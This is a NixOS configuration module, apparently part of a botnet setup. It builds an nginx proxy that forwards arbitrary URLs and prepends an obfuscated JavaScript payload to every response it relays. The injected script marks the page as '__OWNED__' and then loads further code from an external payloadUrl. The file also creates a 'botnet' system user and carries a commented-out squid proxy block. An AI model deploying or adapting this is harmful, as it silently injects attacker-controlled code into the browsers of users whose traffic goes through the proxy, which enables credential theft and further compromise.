{ payloadUrl }:

{ pkgs, ... }:

let

  configFile = pkgs.writeText "squid.conf" ''
    http_port 3128

    acl all src all

    acl SSL_ports port 443
    acl Safe_ports port 80		# http
    acl Safe_ports port 21		# ftp
    acl Safe_ports port 443		# https
    acl Safe_ports port 70		# gopher
    acl Safe_ports port 210		# wais
    acl Safe_ports port 1025-65535	# unregistered ports
    acl Safe_ports port 280		# http-mgmt
    acl Safe_ports port 488		# gss-http
    acl Safe_ports port 591		# filemaker
    acl Safe_ports port 777		# multiling http
    acl CONNECT method CONNECT

    http_access deny !Safe_ports
    http_access deny CONNECT !SSL_ports

    http_access allow localhost
    http_access deny all

    forwarded_for off
    via off

    access_log daemon:/var/log/squid/access.log squid
    cache_log /var/log/squid/cache.log squid
    pid_filename /run/squid/pid
    cache_effective_user botnet

    url_rewrite_program ${pkgs.python3}/bin/python ${./rewrite.py}
  '';

  payload = pkgs.stdenv.mkDerivation {
    name = "payload.js";
    builder = pkgs.writeText "builder.sh" ''
      ${pkgs.python3}/bin/python3 ${./jshex.py} < ${rawPayload} > $out
    '';
  };

  rawPayload = pkgs.writeText "rawPayload.js" ''
    (function(){
      function payload() {
        if (!window.__OWNED__) {
            window.__OWNED__ = true;
            var script = document.createElement('script');
            script.setAttribute('src', '${payloadUrl}');
            document.getElementsByTagName('html')[0].appendChild(script);
        }
      }
      if (window.addEventListener) {
        window.addEventListener('load', payload)
      } else {
        window.attachEvent('onload', payload)
      }
    })();
  '';

in {

  networking.firewall.allowedTCPPorts = [
    80 3128
  ];

  services.nginx = {
    enable = true;
    package =
      with pkgs;
      callPackage <nixpkgs/pkgs/servers/http/nginx/stable.nix> {
        modules = [
          nginxModules.rtmp nginxModules.dav nginxModules.moreheaders
          nginxModules.echo
          nginxModules.develkit
          nginxModules.lua
        ];
      };
    config = ''
      events {
        worker_connections 1024;
      }

      http {
        resolver 8.8.8.8;
        resolver_timeout 5s;

        server {
          listen 13337;

          location /payload.js {
            alias ${payload};
          }

          location / {

            set_by_lua_block $proxy_scheme {
              return ngx.unescape_uri(ngx.var.arg_scheme)
            }
            set_by_lua_block $proxy_netloc {
              return ngx.unescape_uri(ngx.var.arg_netloc)
            }
            set_by_lua_block $proxy_rest {
              return ngx.unescape_uri(ngx.var.arg_rest)
            }

            set $url "$proxy_scheme://$proxy_netloc$proxy_rest";

            proxy_redirect off;
            proxy_set_header Accept-Encoding "";
            proxy_set_header Host $proxy_netloc;
            proxy_set_header X-Forwarded-Host $proxy_netloc;
            proxy_pass "$url";

            add_before_body /payload.js;
            addition_types *;

          }
        }
      }
    '';
  };

  # systemd.services.squid = {
  #   description = "Web Proxy Cache Server";
  #   after = [ "network.target" ];
  #   wantedBy = [ "multi-user.target" ];

  #   serviceConfig = {
  #     Type = "forking";
  #     PIDFile = "/run/squid/pid";
  #     ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
  #     ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
  #     ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
  #   };

  #   preStart = ''
  #     mkdir -p /run/squid
  #     mkdir -p /var/log/squid
  #     chown botnet /run/squid
  #     chown botnet /var/log/squid
  #   '';

  # };

  users.extraUsers.botnet = {
    group = "botnet";
    uid = 1337;
  };

  users.extraGroups.botnet = {
    gid = 1337;
  };

}
